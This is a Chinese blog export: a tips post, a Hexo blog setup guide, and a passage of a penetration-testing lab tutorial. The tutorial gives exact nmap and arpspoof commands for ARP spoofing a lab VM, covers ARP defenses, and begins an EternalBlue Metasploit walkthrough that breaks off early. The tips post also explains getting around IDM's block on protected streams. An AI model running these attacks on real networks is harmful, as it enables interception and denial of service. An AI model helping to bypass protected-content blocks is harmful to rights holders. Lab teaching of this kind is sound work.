<h3 id="PotPlayer在线播放"><a href="#PotPlayer在线播放" class="headerlink" title="PotPlayer在线播放"></a><strong>PotPlayer在线播放</strong></h3><p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230107215617868.png" alt="image-20230107215617868"></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230107215837821.png" alt="image-20230107215837821"></p>
<p><strong>视频翻转问题:ctrl+v 上下翻转，ctrl+z 左右旋转</strong></p>
<p><strong>我不建议用百度网盘看电影。。。巨卡（没代理的前提下，不要作死！不要作死！）</strong></p>
<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="用负载均衡获取最高网速"><a href="#用负载均衡获取最高网速" class="headerlink" title="用负载均衡获取最高网速"></a>用负载均衡获取最高网速</h1><h3 id="理论"><a href="#理论" class="headerlink" title="理论"></a><strong>理论</strong></h3><ul>
<li>目前我们的电脑插上网线和连上wifi都只能使用一方（一般是用网线的那个网口），而wifi这个口却造成了浪费（因为流量不通过这个位置）</li>
</ul>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/1.png"></p>
<ul>
<li>然后我们通过<code>cmd</code>里面的<code>route print</code>看到了 问题所在</li>
</ul>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/2.png"></p>
<ul>
<li>理论正确那么动手实践</li>
</ul>
<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a><strong>实现过程</strong></h3><ul>
<li><p>跃点数可以通过<code>右下角网络连接图标</code>   &gt;  <code>网络和Internet设置</code>  &gt;  <code>更改适配器选项</code>  &gt;  <code>以太网属性</code>   &gt;  <code>Internet协议版本4(TCP/IPv4)</code>  &gt;  <code>高级(V)</code>  &gt;  <code> 自动跃点数改为手动的（我一般写20）</code></p>
</li>
<li><p>wifi的跃点数也一样跃点数可以通过<code>右下角网络连接图标</code>   &gt;  <code>网络和Internet设置</code>  &gt;  <code>更改适配器选项</code>  &gt;  <code>WLAN属性</code>   &gt;  <code>Internet协议版本4(TCP/IPv4)</code>  &gt;  <code>高级(V)</code>  &gt;  <code> 自动跃点数改为手动的（我一般写20）</code></p>
</li>
<li><p>然后重启电脑重新测试，将发现速度翻倍了</p>
</li>
</ul>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/3.png"></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/4.png" alt="4"></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/5.png" alt="5"></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/6.png" alt="6"></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/7.png" alt="7"></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/8.png" alt="8"></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/9.png" alt="9"></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/10.png" alt="10"></p>
<ul>
<li>千万别忘记还有WLAN没弄，WLAN的步骤也和以太网一样</li>
</ul>
<p>接下来见证奇迹（见奇迹的准备工作：记得插网线，记得连wifi。。。。。。谢谢！！！）</p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/11.png"></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/12.png" alt="12"></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/13.png" alt="13"></p>
<h1 id="浏览器多线程下载"><a href="#浏览器多线程下载" class="headerlink" title="浏览器多线程下载"></a>浏览器多线程下载</h1><ul>
<li>Chrome 浏览器，地址栏输入并回车：<code>chrome://flags/#enable-parallel-downloading</code></li>
<li>Edge 浏览器，地址栏输入并回车：<code>edge://flags/#enable-parallel-downloading</code></li>
</ul>
<p>设置成为<code>enable</code></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230211225934696.png" alt="image-20230211225934696"></p>
<h1 id="由于法律原因，IDM无法下裁此受保护的数据"><a href="#由于法律原因，IDM无法下裁此受保护的数据" class="headerlink" title="由于法律原因，IDM无法下裁此受保护的数据"></a>由于法律原因，IDM无法下裁此受保护的数据</h1><p><strong>自从迅雷收费并对免费会员不提供加速后，新一代下载工具IDM（Internet Download Manager）越来越火。并且，由于它自带的资源嗅探器非常强大，用来下载网页中的流媒体视频变得更加方便，IDM的视频和音频探测功能涵盖了日常所见的大多数网站，在浏览这些网页的时候，只需要点一下资源嗅探器的悬浮按钮就可以下载对应的音视频资源。</strong></p>
<p><strong>但是，越来越多的人发现，idm有些视频无法下载。就像迅雷屏蔽版权资源一样，显示<code>由于法律原因，IDM无法下裁此受保护的数据</code>。并且IDM因为没有相应的技术来判断你受否有购买授权，所以，即便是你购买了授权，这些内容也是不能使用IDM下载的。如下图：</strong></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230718122525316.png" alt="image-20230718122525316"></p>
<p><strong>由于IDM嗅探到的视频大多都是m3u8资源，所以，可以通过IDM嗅探到的m3u8地址来另辟蹊径解决部分视频无法下载的问题。具体操作为：在弹出上述窗口导致无法下载后，我们返回到刚才播放视频的网页。此时idm悬浮窗会再次出现。然后复制下载的m3u8视频链接，将其导入<code>N_m3u8DL-CLI</code>下载即可</strong></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230718122851569.png" alt="image-20230718122851569"></p>
<h2 id="下载N-m3u8DL-CLI工具"><a href="#下载N-m3u8DL-CLI工具" class="headerlink" title="下载N_m3u8DL-CLI工具"></a>下载N_m3u8DL-CLI工具</h2><p><a href="https://github.com/nilaoda/N_m3u8DL-CLI/releases">N_m3u8DL-CLI</a></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230718124012148.png" alt="image-20230718124012148"></p>
<p><strong>下载带有with_ffmpeg的版本，下载后，解压出来，运行文件夹内的<code>N_m3u8DL-CLI.exe</code>，出现黑色窗口后点击鼠标右键会自动粘贴刚才复制的m3u8地址，点击回车即可开始下载。</strong></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230718123843492.png" alt="image-20230718123843492"></p>
<p><strong>或者使用带图形化界面的<code>N_m3u8DL-CLI-SimpleG.exe</code></strong></p>
<p><img src="/2023/01/07/%E5%A5%BD%E7%8E%A9%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80/image-20230718123717678.png" alt="image-20230718123717678"></p>
]]></content>
      <categories>
        <category>黑科技</category>
      </categories>
      <tags>
        <tag>黑科技</tag>
      </tags>
  </entry>
  <entry>
    <title>基于next主题的hexo博客</title>
    <url>/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="基于next主题的hexo博客"><a href="#基于next主题的hexo博客" class="headerlink" title="基于next主题的hexo博客"></a>基于next主题的hexo博客</h1><h2 id="创建blog文件夹"><a href="#创建blog文件夹" class="headerlink" title="创建blog文件夹"></a>创建blog文件夹</h2><p><strong>首先，创建一个文件夹然后重命名，你以后写的博客内容将跟随这个文件夹一辈子所以，无论是刮风下雨还是重装系统，你都要对它进行备份（备份很简单，压缩一份，拿U盘拷走就行了）。</strong></p>
<p><strong>现在，创建一个名叫apple的文件夹</strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423011836912.png" alt="image-20230423011836912"></p>
<p><strong>现在，这个文件夹还不能叫blog文件夹，因为它还没有hexo blog的内容</strong></p>
<p><strong>对blog文件夹进行hexo的初始化，让其具有博客能力</strong></p>
<p><strong>在博客文件夹内，点击鼠标右键，选择<code>Git Bash Here</code>调出Git窗口，输入初始化命令</strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423012104900.png" alt="image-20230423012104900"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423012408486.png" alt="image-20230423012408486"></p>
<p><strong>然后，我们看到博客出现一堆文件</strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423012446932.png" alt="image-20230423012446932"></p>
<h2 id="博客基础命令和前期设置"><a href="#博客基础命令和前期设置" class="headerlink" title="博客基础命令和前期设置"></a>博客基础命令和前期设置</h2><p><strong>现在的blog文件夹已经算是个具备博客的能力了，现在学习我们后面要用到的几个关键的博客命令</strong></p>
<h3 id="创建博客文章命令"><a href="#创建博客文章命令" class="headerlink" title="创建博客文章命令"></a>创建博客文章命令</h3><p><strong>下面这个命令会创建当前时间点的markdown格式文章以及对应的博客文章文件夹</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new “文章名字”</span><br></pre></td></tr></table></figure>

<p><strong>下面我们创建一个<code>我的第一篇博客</code>文章看看咯</strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423013119422.png" alt="image-20230423013119422"></p>
<p><strong>创建完成之后，在博客文件夹下的<code>\source\_posts</code>可以看到你创建的博客文章</strong></p>
<p><strong>下面出现了两篇文章，<code>hello-world</code>是hexo官方给的测试文章，然后这个<code>我的第一篇博客</code>则是我自己创建的，那么前面作者不是说会自动创建相应的文件夹吗？难道这B。。。站up欺骗了我？当然不是，这个自动创建是要改配置文件的</strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423013101068.png" alt="image-20230423013101068"></p>
<p><strong>现在，我们先回到博客文件夹最初页面，找到<code>_config.yml</code>,然后用你的记事本或者其他编辑软件找到里面的<code>post_asset_folder:false</code>这个参数（大概在43行），把它改成<code>true</code>即可</strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423014021985.png" alt="image-20230423014021985"></p>
<p><strong>保存退出之后，我们再创建<code>我的第二篇博客</code>试一下</strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423014222069.png" alt="image-20230423014222069"></p>
<p><strong>那么，为啥需要这个文件夹呢？其实一个博客的灵魂就在于<code>图文并茂</code>，如果光是代码和文章，那么除了最了解它的人（作者本人）另外就是已经懂这个博客文章的人才能看的懂了。如果是萌新，看这个就会觉得学习这个东西成本太高，就不会去深耕下去。配上图可以加快各位的学习速度，也可以让作者复盘的时候更流畅，这么说来就很显然易见了，这个文件夹是装与之匹配的图片用的</strong></p>
<p><strong>下面，我推荐typora作为我们博客文章的编辑软件，这个软件目前是收费的，如果实在囊中羞涩的朋友可以看看网上有什么特殊手段搞到，这里就不再赘述了</strong></p>
<p><strong>打开typora，选择左上角<code>选择文件-&gt;偏好设置-&gt;图像</code></strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423015157051.png" alt="image-20230423015157051"></p>
<p><strong>然后，勾选<code>优先使用相对路径</code>和<code>对本地位置的图片应用上述规则</code></strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423015243688.png" alt="image-20230423015243688"></p>
<p>然后，再选择<code>插入图片时</code>要<code>复制到指定路径</code></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423015421816.png" alt="image-20230423015421816"></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423015534220.png" alt="image-20230423015534220"></p>
<p><strong>我们可以拖一张进<code>我的第二篇博客</code>看看是不是已经有复制到博客文章自己的文件夹下</strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423015940419.png" alt="image-20230423015940419"></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423020000832.png" alt="image-20230423020000832"></p>
<p><strong>结果很显然了，桌面的图片拖进来之后路径不是引用桌面的，很显然已经更改到自家的博客文章文件夹里</strong></p>
<h3 id="生成博客命令"><a href="#生成博客命令" class="headerlink" title="生成博客命令"></a>生成博客命令</h3><p><strong>上面，我们讲到了博客文章已经拉了一张图片了，这个时候我想看看它在博客呈现什么样子，这个时候就要生成博客，下面这个命令就可以把图片和文章生成静态的html网页</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423020457077.png" alt="image-20230423020457077"></p>
<p><strong>可以看到已经生成了内容，那么怎么在本地查看呢？总不能打开文件夹看看吧，那多麻烦是吧！放心hexo可没那么傻，下面hexo服务器端启动命令就可以在浏览器看到具体页面</strong></p>
<p><strong>另外这里加入一个小提示，随着hexo博客里面文章图片的日积月累，hexo生成能力越来越慢，然后也会出现内存溢出等现象。。。目前我还没遇到，但是<code>hexo生成能力越来越慢</code>这个我已经遇到了，就在博客到达900M的时候，用上多线程<code>-c 线程数</code>可以大大提升hexo生成能力。</strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230701001519066.png" alt="image-20230701001519066"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不要超过最大线程数</span></span><br><span class="line">hexo -g -c 12</span><br></pre></td></tr></table></figure>

<h3 id="hexo服务器端启动命令"><a href="#hexo服务器端启动命令" class="headerlink" title="hexo服务器端启动命令"></a>hexo服务器端启动命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423020802817.png" alt="image-20230423020802817"></p>
<p><strong>在命令行输入之后，可以复制这个<code>http://localhost:4000/</code>到自己的浏览器看自己写的博客内容了</strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423020932924.png" alt="image-20230423020932924"></p>
<p><strong>这里我们看到自己生成的第一篇和第二篇博客，而且可以看到hexo的测试博客页面，但是总感觉啊不对劲是吧！我们博客二图片没出来，只显示了<code>微信图片</code>,这就是作者说的“图文并茂”吗？</strong></p>
<p><img src="/2023/04/25/%E5%9F%BA%E4%BA%8Enext%E4%B8%BB%E9%A2%98%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230423021135893.png" alt="image-20230423021135893"></p>
<p><strong>其实，这个就要引入下个内容<code>“插件”</code>了</strong></p>
<h3 id="安装图片插件"><a href="#安装图片插件" class="headerlink" title="安装图片插件"></a>安装图片插件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透 and web</title>
    <url>/2022/11/23/%E6%B8%97%E9%80%8F-and-web/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="渗透-and-web"><a href="#渗透-and-web" class="headerlink" title="渗透 and web"></a>渗透 and web</h1><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="ARP攻防"><a href="#ARP攻防" class="headerlink" title="ARP攻防"></a>ARP攻防</h3><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><p><strong>ARP即地址解析协议，在知道目标主机IP地址的情况下，如果需要得到目标知道的MAC地址，ARP协议即可以达到。如果该协议被恶意地对网络进行攻击，其后果是非常严重的。</strong></p>
<p><strong>ARP通常包括两个协议包，一个ARP请求包与一个ARP回应包，请求包如图2.37所示，ARP请求包是一个广播包，在ARP请求包中，源主机发出“Who has 192.168.1.2? Tell 192.168.1.128”。</strong></p>
<p><strong>如图：</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/1.png" alt="1"></p>
<p><strong>在ARP应答包中，源主机接收到目标主机发过来的应答包，“192.168.1.2 is at 00:50:56:ef:93:1d”，非常明了，也就是PC机192.168.1.2的MAC地址为00:50:6:ef:93:1d。常见的ARP欺骗有网关欺骗与主机骗两种：</strong></p>
<ul>
<li><p><strong>一种是对路由器ARP表的欺骗</strong></p>
<p><strong>ARP欺骗的原理是截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。</strong></p>
</li>
<li><p><strong>第二种是对内网PC的网关欺骗</strong></p>
<p><strong>第二种ARP欺骗的原理是伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，网络掉线了。</strong></p>
</li>
</ul>
<h4 id="ARP欺骗工具"><a href="#ARP欺骗工具" class="headerlink" title="ARP欺骗工具"></a>ARP欺骗工具</h4><p><strong>arpspoof是一款ARP欺骗工具，下面通过实验演示ARP欺骗，实验环境为攻击者为kali系统，IP地址为192.168.1.129，靶机为Windows 10，其IP地址为192.168.1.128，具体操作过程如下所示：</strong></p>
<p><strong>在kali系统中安装dsniff 嗅探工具：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install dsniff </span><br></pre></td></tr></table></figure>

<p><strong>安装完成之后我们可以使用<code>arpspoof</code>命令来攻击靶机(192.168.1.128)</strong></p>
<p><strong>然后我们在<code>VMware  Workstation</code>里面的【菜单栏】里面点击【编辑】向下找到【虚拟网络编辑器】，进到里面调配网络段使两台电脑在同一个局域网内。</strong></p>
<p><strong>进入【虚拟网络编辑器】之后点击【VMnet8】然后点击右下角的【更改设置】获取管理员权限，然后把左下角的子网ip更改为【192.168.1.0】，然后点击【确定】，然后两台设备(攻击者kali主机和靶机都在同一个局域网内了)</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/2.png" alt="2"></p>
<p><strong>在win10主机里面：</strong></p>
<p><strong>我们在控制面版里面找到【window Defender 防火墙】，点击进去后在左边找到【启用或者关闭 window Defender 防火墙】，把win10的防火墙全部关闭，便以我们接下来的实验。</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/3.png" alt="3"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/4.png" alt="4"></p>
<p><strong>我们首先打开攻击者kali系统，对局域网内的网段进行一次全局扫描来获取靶机的目标ip</strong></p>
<p><strong>打开kali后，右击桌面点击【Open Terminal Here】打开命令窗口。</strong></p>
<p><strong>在命令窗口输入：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/5.png" alt="5"></p>
<p><strong>(kali㉿kali)-[~&#x2F;Desktop]</strong><br><strong>└─$ nmap -sP 192.168.1.0&#x2F;24<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-11-03 05:25 EDT</strong><br><strong>Nmap scan report for 192.168.1.2       # 这个是网关ip</strong><br><strong>Host is up (0.00059s latency).</strong><br><strong>Nmap scan report for 192.168.1.128  # 这个是靶机ip</strong><br><strong>Host is up (0.0036s latency).</strong><br><strong>Nmap scan report for 192.168.1.129  # 这个是kali的ip</strong><br><strong>Host is up (0.0020s latency).</strong><br><strong>Nmap done: 256 IP addresses (3 hosts up) scanned in 2.77 seconds</strong></p>
<p><strong>然后获取我们局域网内的地址</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">route</span><br></pre></td></tr></table></figure>

<p><strong>kali㉿kali)-[~&#x2F;Desktop]</strong><br><strong>└─$ route</strong><br><strong>Kernel IP routing table</strong><br><strong>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</strong><br><strong>default         192.168.1.2     0.0.0.0         UG    100    0        0 eth0</strong><br><strong>192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0</strong></p>
<p><strong>通过上下对比，可以确定网关IP是192.168.1.2，靶机ip是192.168.1.128，那么前期的信息采集完成，我们接下来对目标靶机进行arp攻击。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arpspoof -i eth0 -t 目标ip 主机ip(路由器)      <span class="comment">#-i是指定网卡攻击，可以用ifconfig命令查看网卡 </span></span><br></pre></td></tr></table></figure>

<p><strong>这里我们使用这个命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arpspoof -i eth0 -t 192.168.1.128 192.168.1.2</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/6.png" alt="6"></p>
<p><strong>这个时侯的win10还能愉快的上网</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/7.png" alt="7"></p>
<p><strong>但是攻击命令按下去后，想打开网页都成为一种奢望</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/8.png" alt="8"></p>
<p><strong>取消kali的arp攻击(ctrl + c)后，win10的网络恢复正常</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/9.png" alt="9"></p>
<p><strong>我们来对比一下没被攻击前的win10的arp表和被攻击后的arp表的变化</strong></p>
<ul>
<li><strong>没被攻击前</strong></li>
</ul>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/10.png" alt="10"></p>
<ul>
<li><strong>被攻击后</strong></li>
</ul>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/11.png" alt="11"></p>
<p><strong>没攻击前的路由mac地址是【00-50-56-ef-93-1d】，被攻击后路由mac地址变成了【00-0c-29-c7-25-1a】</strong></p>
<p><strong>并且，还有一个特别有趣的地方就是【192.168.1.129】的mac地址和网关路由的mac地址完全一致，那么我们可以推断出上面那条攻击命令是把攻击者kali的mac替换了网关路由的mac</strong></p>
<h4 id="防范ARP攻击"><a href="#防范ARP攻击" class="headerlink" title="防范ARP攻击"></a>防范ARP攻击</h4><p><strong>虽然上面的攻击手段能达到断网、欺骗等效果，但是arp攻击已经是几十年的手段了，它有着种种局限性，例如：ARP攻击仅能在以太网进行，无法对外网进行攻击。</strong></p>
<h5 id="用命令完成防御"><a href="#用命令完成防御" class="headerlink" title="用命令完成防御"></a>用命令完成防御</h5><p><strong>原理：在上面我们知道arp工作原理是不断发送欺骗信息来对我们的arp变进行修改，那么我们可以使用手动配置的arp静态表来防止别人的arp欺骗攻击。（但是，静态配置的对不同的环境有着不好的兼容性，也就是说换一个地方工作，我们又要重新配一次静态arp，这样就会很麻烦，第二种办法则很好的解决这种问题，而且对新人非常友好。）</strong></p>
<p><strong>1、Win10以管理员身份运行<code>cmd</code>命令提示符</strong><br><strong>我们可以在Windows10系统的开始菜单上，单击鼠标右键，这时候出现的菜单中，我们选择命令提示符（管理员）点击打开这样即可。</strong><br><strong>2、首先，我们查询本地连接的网卡ID号</strong></p>
<p><strong>运行命令：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh i i show <span class="keyword">in</span></span><br></pre></td></tr></table></figure>

<p><strong>如下图所示：</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/12.png" alt="12"></p>
<p><strong>从上图可以知道，“Internet”的网卡ID为15，注意是我们需要的是<code>Idx</code>一栏而不是<code>Met</code>。</strong></p>
<p><strong>接下来用命令：arp -a来获取网关路由的ip地址和mac地址</strong></p>
<p><strong>3、绑定</strong><br><strong>在DOS界面运行命令：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh -c i i add neighbors 15 192.168.1.2 00-50-56-ef-93-1d       （这里的15就是查询到的本地网卡的ID）</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/13.png" alt="13"></p>
<p><strong>然后运行命令：arp -a查询是否绑定成功</strong></p>
<p><strong>绑定成功的标志就是右边的【动态】变成了【静态】</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/14.png" alt="14"></p>
<p><strong>4、单次解绑</strong><br><strong>之前通过arp–s方式手动绑定了网关MAC地址，通过arp–d清除该绑定即可。</strong><br><strong>arp -d 192.168.1.2</strong></p>
<p><strong>5、永久解绑</strong><br><strong>如过想解除绑定在CMD命令行程序里输入</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh i i reset </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/15.png" alt="15"></p>
<p><strong>不过需要重启才能生效。重启后本地IP地址、网关也要重新设置。</strong></p>
<h5 id="使用软件进行防护"><a href="#使用软件进行防护" class="headerlink" title="使用软件进行防护"></a>使用软件进行防护</h5><p><strong>国产软件360安全卫士里面有个实用的功能大全，里面的360流量防火墙可以对您局域网内的设备进行防护，刚入门的小白还是建议使用软件辅助学习会更加事半功倍。</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/16.png" alt="16"></p>
<h3 id="永恒之蓝攻击"><a href="#永恒之蓝攻击" class="headerlink" title="永恒之蓝攻击"></a>永恒之蓝攻击</h3><h4 id="ms17-010-eternalblue"><a href="#ms17-010-eternalblue" class="headerlink" title="ms17_010_eternalblue"></a>ms17_010_eternalblue</h4><p>本次实验有两台设备，Kali Linux(攻击机) ip:192.168.110.132、Windows 7(靶机) ip:192.168.110.133</p>
<p>注意：实验前确认靶机的防火墙已经被关闭</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 收集目标系统信息</span></span><br><span class="line">nmap -T4 -A 192.168.110.133</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720013732287.png" alt="image-20220720013732287"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启msf对靶机进行渗透</span></span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720013841932.png" alt="image-20220720013841932"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720014154283.png" alt="image-20220720014154283"></p>
<p>首先我们先检查靶机是否能被永恒之蓝所攻击</p>
